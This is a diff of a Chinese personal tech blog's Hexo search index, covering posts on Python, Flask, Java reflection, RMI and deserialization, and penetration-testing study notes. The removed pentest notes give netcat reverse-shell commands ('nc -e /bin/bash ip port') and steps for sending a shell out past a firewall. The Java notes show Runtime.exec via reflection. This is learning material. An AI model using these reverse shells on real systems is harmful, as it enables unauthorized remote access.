class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的订单&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的资料&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index()</span><br><span class="line">order()</span><br><span class="line">profile()</span><br></pre></td></tr></table></figure>
-
-<p>之后的相应是</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PS C:\VScodeproject&gt; &amp; C:/Users/ASUS/AppData/Local/Programs/Python/Python310/python.exe c:/VScodeproject/python/python-study/装饰器应用.py</span><br><span class="line">请先登录</span><br><span class="line">还未完成用户登录操作</span><br><span class="line">请输入用户名：admin</span><br><span class="line">请输入密码：<span class="number">123456</span></span><br><span class="line">登录成功</span><br><span class="line">欢迎来到首页</span><br><span class="line">欢迎来到我的订单</span><br><span class="line">欢迎来到我的资料</span><br></pre></td></tr></table></figure>
-
-<h1 id="三、Pickle和Json模块的总结"><a href="#三、Pickle和Json模块的总结" class="headerlink" title="三、Pickle和Json模块的总结"></a>三、Pickle和Json模块的总结</h1><p>Pickle是将对象（数据）转化为字节，json是将对象（数据）转化为json格式</p>
-<blockquote>
-<p>1、dumps    把对象（数据）转化为字节</p>
-<p>2、loads       把字节转化回对象（数据）</p>
-<p>3、dump      把对象序列化成字节之后写入到文件</p>
-<p>3、load         把文件中的字节反序列化成对象 </p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>java反序列化以及一些前置知识</title>
-    <url>/2023/11/09/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9A%84%E4%B8%80%E4%BA%9B%E8%87%AA%E6%88%91%E7%90%86%E8%A7%A3/</url>
-    <content><![CDATA[<p>最近学习了java反序列化的相关知识，就在这稍微做一些总结。</p>
-<span id="more"></span>
-
-<h1 id="一、java反射"><a href="#一、java反射" class="headerlink" title="一、java反射"></a>一、java反射</h1><p>首先就是介绍总结一下java反射中用到的一些相关方法，当然也不是直接对着方法名记忆，那样太枯燥了，主要就是在使用的过程中去学习。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//这个的意思就是获取到java.lang.Runtime这个类，是一种获取类最常见的方法，然后获取到的类就被“等同”于clazz（！！！这里要想起来类和对象之间的区别，这两个不是同一种东西！！！）</span></span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br><span class="line"><span class="comment">//这里我们就逐步分析，首先就是getMethod就是获取一个类的方法</span></span><br><span class="line"><span class="comment">//格式： 类.getMethod（“方法名”, 这个方法需要传递的参数类型）</span></span><br><span class="line"><span class="comment">//然后就是invoke，这是一个调用上面获得的方法。</span></span><br><span class="line"><span class="comment">//格式： 方法名.(类的一个对象,需要传递给方法的参数)</span></span><br><span class="line"><span class="comment">//newInstance就是调用该类的构造方法去实例化一个对象</span></span><br></pre></td></tr></table></figure>
-
-<p>当然这样直接去运行时会产生报错的！！！这又是为什么呢？</p>
-<p>这里主要就是因为我们无法通过newInstance去获得类的对象，而这里是因为Runtime的构造方法是私有的，是一种”单例”的设计模式</p>
-<blockquote>
-<p>单例的设计模式：主要是考虑到某些类一般只需要类的初始化时使用一次构造方法，而不是每次都需要去再重新使用构造方法，但这样的话我们又应该怎么样去调用构造方法呢？所以设计者就设计了一个静态方法，像这里的就是getRuntime这个方法，使用这个方法就会返回一个对象</p>
-</blockquote>
-<p>所以修改之后的代码就是</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethed.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>这样就可以去调用到我们需要的方法了。</p>
-<p>当然这样也是还有点缺点的，就比如如果没有这个getRuntime的方法呢？这又应该怎么办？</p>
-<p>这个时候就可以使用getConstructor这个方法去获取到我们想要的类。</p>
-<blockquote>
-<p>格式： 类.getConstructor(构造方法的参数类型)</p>
-</blockquote>
-<p>eg.</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>
-
-<p>然后就是如果构造方法是私有方法，我们应该去使用getDeclaredMethod这个方法。</p>
-<blockquote>
-<p>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 </p>
-<p>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</p>
-<p>还有就是getConstructor和getDeclaredConstructor基本上相似的，这里就不过多解释了</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>setAccessible必须要设置为true，不然无法去使用。</p>
-<h1 id="二、RMI"><a href="#二、RMI" class="headerlink" title="二、RMI"></a>二、RMI</h1><p>RMI全称是Remote Method Invocation，远程⽅法调⽤。听这名字应该也就知道，就是去从调用一个远程主机上的java方法，在这里就挑一些重点的代码片段进行讲解。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());(这里是服务器上启动的)</span><br></pre></td></tr></table></figure>
-
-<p>首先第一行这里就是创建并且执行Registry服务，这个服务就是相当于一个中继器，我将类和一个名字绑定丢到这里面去，别的人就可以通过名字去拿到这个对应的类，这就是Registry所起到的一个作用。然后就是第二行，就是将本机的一个类给绑定到了一个Registry服务上，这样等之后就可以去直接拿到这个类了。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)Naming.lookup(<span class="string">&quot;rmi://vps_ip:1099/Hello&quot;</span>);(本机运行)</span><br></pre></td></tr></table></figure>
-
-<p>这里就通过Naming的lookup方法去寻找这个rmi类，我们就可以在Registry中拿到我们想要的类。</p>
-<p>codebase的利用方法</p>
-<p>在以前的有段时间，java是可以运行在浏览器上的，就有一个codebase属性，这是一个地址，去告诉哪个地方寻找类，这个时候我们就可以使用rmi的相关操作，去使其加载我们自己部署的服务器上的一些恶意类。</p>
-<p>就比如在log4j这个CVE中，也是可以去使用rmi去实现的，去完成反弹shell从而获得权限。</p>
-<h1 id="三、serialize🌟"><a href="#三、serialize🌟" class="headerlink" title="三、serialize🌟"></a>三、serialize🌟</h1><p>这是学习的重难点，我现在也还知识初步了解一些，还没完全弄完😭</p>
-<p>一般web手初识反序列化都是从php开始，首先就java的反序列化和php的还是有很大区别的，php是直接利用serialize和unserialize这两个函数进行序列化和反序列化的过程，我们无法去控制这个过程中的任何东西，而java就不一样了。</p>
-<blockquote>
-<ul>
-<li>writeObject：序列化</li>
-<li>readObject：反序列化</li>
-</ul>
-</blockquote>
-<p>这两个主要是java中序列化反序列化所需要使用到的，一般需要搭配一些其他的东西去使用。</p>
-<p>eg</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;result.txt&quot;</span>);  <span class="comment">//用于保存序列化数据</span></span><br><span class="line">     ObjectOutputStream obj_out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);   <span class="comment">//实例化一个对象输出流</span></span><br><span class="line">     <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">     u.setName(<span class="string">&quot;6pc1&quot;</span>);</span><br><span class="line">     obj_out.writeObject(u);   <span class="comment">//利用writeObject方法将序列化对象存储在本地</span></span><br><span class="line">     obj_out.close();</span><br><span class="line">     System.out.println(<span class="string">&quot;User对象序列化成功！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.txt&quot;</span>);  <span class="comment">//读取之前保存的序列化数据</span></span><br><span class="line">     <span class="type">ObjectInputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);  <span class="comment">//实例化一个对象输入流</span></span><br><span class="line">     <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> (User)ins.readObject();      <span class="comment">//利用readObject方法将序列化对象转为对象</span></span><br><span class="line">     system.out.println(<span class="string">&quot;User对象反序列化成功！&quot;</span>);</span><br><span class="line">     System.out.println(u.getName());</span><br><span class="line">     ins.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这就是java反序列话的主要过程，是可以自己去操作序列化反序列化的一些过程的，就比如在序列化后的文件中添加一些数据一类的</p>
-<p>这也不是唯一一种，我们也可以用byte流的方法代替文件流</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">ObjectOutputStream obj_out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>java</category>
-      </categories>
-      <tags>
-        <tag>java</tag>
-        <tag>serialize</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于博客搭建的一些自我心得</title>
-    <url>/2023/11/09/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E8%87%AA%E6%88%91%E5%BF%83%E5%BE%97/</url>
-    <content><![CDATA[<p>首先，这篇博客并不会详细讲解搭博客的过程什么的，只是稍微分享一下我自己搭博客时遇到的一些问题和学到的一些东西。</p>
-<span id="more"></span>
-
-<h1 id="一、博客搭建主体的选择"><a href="#一、博客搭建主体的选择" class="headerlink" title="一、博客搭建主体的选择"></a>一、博客搭建主体的选择</h1><p>我感觉现在大部分主流的使用的博客主体就是两种，(当然主要也是我接触到的博客看好像都是这两种),分别就是hexo和WordPress，不过由于我现在还是囊中羞涩，所以就去使用了免费的github+hexo去搭建，而对于WordPress而言，搭建则需要有一个服务器才能去完成。</p>
-<h1 id="二、搭建博客时遇到的一些问题"><a href="#二、搭建博客时遇到的一些问题" class="headerlink" title="二、搭建博客时遇到的一些问题"></a>二、搭建博客时遇到的一些问题</h1><p>博客的普通搭建还是非常简单的，基本就是按照网上的教程来就不会有什么问题的，主要就是主题的配置，这才是最难的。本来我是想着，主题这肯定就是要选个特别好看的啊，这样才炫，所以就选择了ParticleX这个主题，配置完了发现的确很炫啊，然后过了一段时间，我打算吧分类、标签什么的去弄好的时候，就发现也不知道为什么识别不出来创建页面的类型，试了好多方法都不行，就重新搭了，然后就更惨了，发现链代码块都识别错误了，完全没发用，又试了好几次，发现都不行，只能换成最通用的next主题了，😭，不过next主题其实也还不错，稳定而且功能什么的开发的都很全，网上教程很全，又费了一段时间也算成功搭好了。</p>
-<h1 id="三、一些小建议"><a href="#三、一些小建议" class="headerlink" title="三、一些小建议"></a>三、一些小建议</h1><p>建议要是很有时间的话就是挑自己喜欢的博客吧，慢慢改改这最后肯定还是很炫的，不是那么在意外观的感觉next就很够用了，至少各种功能方便去配置。还有就是hexo我感觉相对WordPress是没有WordPress方便操作的，毕竟那个还有操作的界面什么的，当然，这也还是主要看个人选择。最重要的不在博客的外观，而在于内容，内容好才是真正好的博客！</p>
-]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>blog</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>java学习历程记录-JavaWeb</title>
-    <url>/2023/11/26/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-JavaWeb/</url>
-    <content><![CDATA[<p>最近开始了java的巩固学习，想着就是对着黑马去学习，首先学习的就是javaweb这个模块，所以也就去记录一些学习的历程。</p>
-<span id="more"></span>
-
-<h1 id="一、JDBC的使用"><a href="#一、JDBC的使用" class="headerlink" title="一、JDBC的使用"></a>一、JDBC的使用</h1><h2 id="1、JDBC是什么"><a href="#1、JDBC是什么" class="headerlink" title="1、JDBC是什么"></a>1、JDBC是什么</h2><p>JDBC就是去使用Java语言操作关系型数据库的一套API，从而达到去操作不同的各种数据库。</p>
-<p>java中并没有各种数据库的实现类，只有查询语句，而实现类是各个数据库厂家提供的jar包中实现的，这样就保证了JDBC能够实现对多种数据库的兼容性。</p>
-]]></content>
-      <categories>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>JavaWeb</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>渗透测试学习之路</title>
-    <url>/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
-    <content><![CDATA[<p>已经决定了准备暑假看看去找个实习，对于web手来说，渗透肯定是必不可少的，所以从现在开始，也要抓紧时间去好好学下渗透的相关知识了。</p>
-<span id="more"></span>
-
-<h1 id="1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过"><a href="#1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过" class="headerlink" title="1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过"></a>1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过</h1><blockquote>
-<p>一些参考的资料工具网站</p>
-<p>渗透常见术语<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p>
-<p>渗透中下载：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
-<p>反弹shell：<a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p>
-<p>常见命令：<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p>
-</blockquote>
-<h2 id="1、内网与外网的区别"><a href="#1、内网与外网的区别" class="headerlink" title="1、内网与外网的区别"></a>1、内网与外网的区别</h2><p>外网就是正常我们使用的服务器那种的，我们可以直接通过ip地址去访问，而内网则是在一小范围中使用的，无法直接通过其ip地址去直接找到，这个时候我们只能通过建立通道或者端口指定从而去指定到我们需要访问的内网，就比如虚拟机的ip，就相当于一个内网地址。</p>
-<h2 id="2、出网和进网"><a href="#2、出网和进网" class="headerlink" title="2、出网和进网"></a>2、出网和进网</h2><p>Windows的防火墙对于出网限制很少，而对于进网则有着很大的限制。</p>
-<p>所以在一般情况下，我们使用带有防火墙的主机去将cmd权限发出，使用没有防火墙的主机去连接，防火墙这样就不会起到阻拦的作用了。</p>
-<h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><blockquote>
-<p>Windows：nc -e cmd ip port</p>
-<p>Linux:   nc -e &#x2F;bin&#x2F;bash ip port</p>
-</blockquote>
-<p>内网可以连接外网，外网无法去连接内网。</p>
-<h2 id="4、实战"><a href="#4、实战" class="headerlink" title="4、实战"></a>4、实战</h2><p>①将cmd上传至目标服务器</p>
-<p>②将cmd权限发出，并使用外网主机接受</p>
-<p>③拿到权限，从而去完成渗透</p>
-<h1 id="2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器"></a>2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器</h1><h2 id="1、网站的开发"><a href="#1、网站的开发" class="headerlink" title="1、网站的开发"></a>1、网站的开发</h2><p>这里也就是一些基础的web知识了，学会去购买服务器，域名等，并且以此去搭建一个自己的博客项目，这样也能去更好的理解一下网站的结构等相关知识。在这里就不过多的去讲解了，这都可以自己跟着网上的资料去学习的。</p>
-<h2 id="2、web应用框架"><a href="#2、web应用框架" class="headerlink" title="2、web应用框架"></a>2、web应用框架</h2><p>理解不同WEB应用组成角色功能架构：</p>
-<p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等。</p>
-<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/e0c18ac5a06e048e519805fbc591a642--032f--image-20231129155607968.png" alt="image-20231129155607968"></p>
-<h2 id="3、代理以及抓包"><a href="#3、代理以及抓包" class="headerlink" title="3、代理以及抓包"></a>3、代理以及抓包</h2><p>可以使用bp去实现抓到请求包，并且去修改从而达到我们想要的效果。</p>
-<p>然后就是可以根据响应包的状态码去判断状态。</p>
-<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/f9ff913739a0803b75f280912eff5134--c28f--image-20231129155736090.png" alt="image-20231129155736090"></p>
-<h2 id="4、代理购买的作用"><a href="#4、代理购买的作用" class="headerlink" title="4、代理购买的作用"></a>4、代理购买的作用</h2><p>在网上去购买代理，就可以实现每次点击网站使用的就是不同的ip地址，这样就能去防止自身的ip被拉入黑名单后无法访问的问题。购买代理就像是在主机和被访问服务器之间新增了一个代理服务器，由这个服务器把你的请求拦截并由它发出，最后接收到的返回包也由它经手返回</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-      </tags>
   </entry>
   <entry>
     <title>java学习历程记录-SpringMVC</title>
@@ -1531,6 +1040,497 @@
         <tag>html</tag>
         <tag>css</tag>
         <tag>js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于博客搭建的一些自我心得</title>
+    <url>/2023/11/09/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E8%87%AA%E6%88%91%E5%BF%83%E5%BE%97/</url>
+    <content><![CDATA[<p>首先，这篇博客并不会详细讲解搭博客的过程什么的，只是稍微分享一下我自己搭博客时遇到的一些问题和学到的一些东西。</p>
+<span id="more"></span>
+
+<h1 id="一、博客搭建主体的选择"><a href="#一、博客搭建主体的选择" class="headerlink" title="一、博客搭建主体的选择"></a>一、博客搭建主体的选择</h1><p>我感觉现在大部分主流的使用的博客主体就是两种，(当然主要也是我接触到的博客看好像都是这两种),分别就是hexo和WordPress，不过由于我现在还是囊中羞涩，所以就去使用了免费的github+hexo去搭建，而对于WordPress而言，搭建则需要有一个服务器才能去完成。</p>
+<h1 id="二、搭建博客时遇到的一些问题"><a href="#二、搭建博客时遇到的一些问题" class="headerlink" title="二、搭建博客时遇到的一些问题"></a>二、搭建博客时遇到的一些问题</h1><p>博客的普通搭建还是非常简单的，基本就是按照网上的教程来就不会有什么问题的，主要就是主题的配置，这才是最难的。本来我是想着，主题这肯定就是要选个特别好看的啊，这样才炫，所以就选择了ParticleX这个主题，配置完了发现的确很炫啊，然后过了一段时间，我打算吧分类、标签什么的去弄好的时候，就发现也不知道为什么识别不出来创建页面的类型，试了好多方法都不行，就重新搭了，然后就更惨了，发现链代码块都识别错误了，完全没发用，又试了好几次，发现都不行，只能换成最通用的next主题了，😭，不过next主题其实也还不错，稳定而且功能什么的开发的都很全，网上教程很全，又费了一段时间也算成功搭好了。</p>
+<h1 id="三、一些小建议"><a href="#三、一些小建议" class="headerlink" title="三、一些小建议"></a>三、一些小建议</h1><p>建议要是很有时间的话就是挑自己喜欢的博客吧，慢慢改改这最后肯定还是很炫的，不是那么在意外观的感觉next就很够用了，至少各种功能方便去配置。还有就是hexo我感觉相对WordPress是没有WordPress方便操作的，毕竟那个还有操作的界面什么的，当然，这也还是主要看个人选择。最重要的不在博客的外观，而在于内容，内容好才是真正好的博客！</p>
+]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python学习经历-2-flask</title>
+    <url>/2023/11/13/python%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86-2-flask/</url>
+    <content><![CDATA[<p>接着之前的python进行学习，决定还是从更加实用点的项目相关的知识去学习，这样也可以去更好的实践当中去锻炼自己的能力，所以就选择了flask这个python中的轻量模块去学习。</p>
+<span id="more"></span>
+
+<h1 id="一、python中虚拟环境的使用"><a href="#一、python中虚拟环境的使用" class="headerlink" title="一、python中虚拟环境的使用"></a>一、python中虚拟环境的使用</h1><p>python是一个非常常见的编程语言，在python使用过程中，我们总是需要使用到很多需要自己安装下载的库，所以一般一个python编程人员的电脑上都有着许许多多的python库，而在我们去开发一些网站，程序相关的时候，我们并不需要去使用到我们所有的库，并且可能需要去使用某些特定版本的库，可这又应该怎么办？这个时候，虚拟环境也就因此诞生了。</p>
+<blockquote>
+<p>在使用Python语言时，通过pip（pip3）来安装第三方包，但是由于pip的特性，系统中只能安装每个包的一个版本。但是在实际项目开发中，不同项目可能需要第三方包的不同版本，迫使我们需要根据实际需求不断进行更新或卸载相应的包，而如果我们直接使用本地的Python环境，会导致整体的开发环境相当混乱而不易管理，这时候我们就需要开辟一个独立干净的空间进行开发和部署，虚拟环境就孕育而生。</p>
+</blockquote>
+<p>下面就直接去记录一下一些虚拟环境的常见使用方法，最流行的就是Virtualenv这个虚拟环境的配置工具</p>
+<p>安装：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install virtualenv virtualenvwrapper-win  //windows环境下</span><br></pre></td></tr></table></figure>
+
+<p>查看虚拟环境有哪些</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">workon</span><br></pre></td></tr></table></figure>
+
+<p>创建一个新的虚拟环境</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mkvirtualenv 虚拟环境名</span><br></pre></td></tr></table></figure>
+
+<p>去使用一个虚拟环境</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">workon 虚拟环境名</span><br></pre></td></tr></table></figure>
+
+<p>注意：虚拟环境文件默认在C盘中用户下中的env中</p>
+<h1 id="二、数据库中的数据迁移操作"><a href="#二、数据库中的数据迁移操作" class="headerlink" title="二、数据库中的数据迁移操作"></a>二、数据库中的数据迁移操作</h1><p>数据库首先先初始化连接设置</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">db_uri = <span class="string">&#x27;mysql+pymysql://root:password@localhost:3306/bookdb&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = db_uri</span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<p>其次就是模块类的创建，也就相当于数据库中的列</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;tb_user&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    age = db.Column(db.Integer, default=<span class="number">1</span>)</span><br><span class="line">    sex = db.Column(db.Boolean, default=<span class="literal">True</span>)</span><br><span class="line">    salary = db.Column(db.Float, default=<span class="number">10000</span>, nullable=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>为什么要做数据迁移呢？在我的理解中这就相当于一个空白数据库的初始化，将创建的类中的列添加到数据库之中，其实就是相当于我们去创建各个字段的过程。</p>
+<p>下面就是用到的命令</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">flask db init   //创建迁移文件夹migrates，只调用一次</span><br><span class="line">flask db migrate //生成迁移文件</span><br><span class="line">flask db upgrade  //执行迁移文件中的升级</span><br><span class="line">flask db downgrade  //执行迁移文件中的降级</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、flask框架中的一些基本操作以及示例"><a href="#三、flask框架中的一些基本操作以及示例" class="headerlink" title="三、flask框架中的一些基本操作以及示例"></a>三、flask框架中的一些基本操作以及示例</h1><h2 id="1、最基础的单文件框架"><a href="#1、最基础的单文件框架" class="headerlink" title="1、最基础的单文件框架"></a>1、最基础的单文件框架</h2><p>文件结构：</p>
+<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/4e67729456c911aa9646284ff32250ab--24ca--image-20231119174414920.png" alt="image-20231119174414920"></p>
+<blockquote>
+<p>static: 静态文件文件夹，用于存放一些像是css，js，image，font等的文件。</p>
+<p>templates：用于存放html网站文件</p>
+</blockquote>
+<p>app.py:（主项目文件）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>) </span><span class="comment">#路由的注册</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello index!&#x27;</span>  <span class="comment">#页面显示的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p><strong>app运行的时候一些可选的参数：</strong></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>debug</td>
+<td>代码更新是否自动重启</td>
+<td>False</td>
+</tr>
+<tr>
+<td>theaded</td>
+<td>是否开启多线程</td>
+<td>False</td>
+</tr>
+<tr>
+<td>port</td>
+<td>指定端口</td>
+<td>5000</td>
+</tr>
+<tr>
+<td>host</td>
+<td>指定主机（设置0.0.0.0可以通过本地IP访问）</td>
+<td>127.0.0.1</td>
+</tr>
+</tbody></table>
+<p>一般项目开发时都会开启debug模式</p>
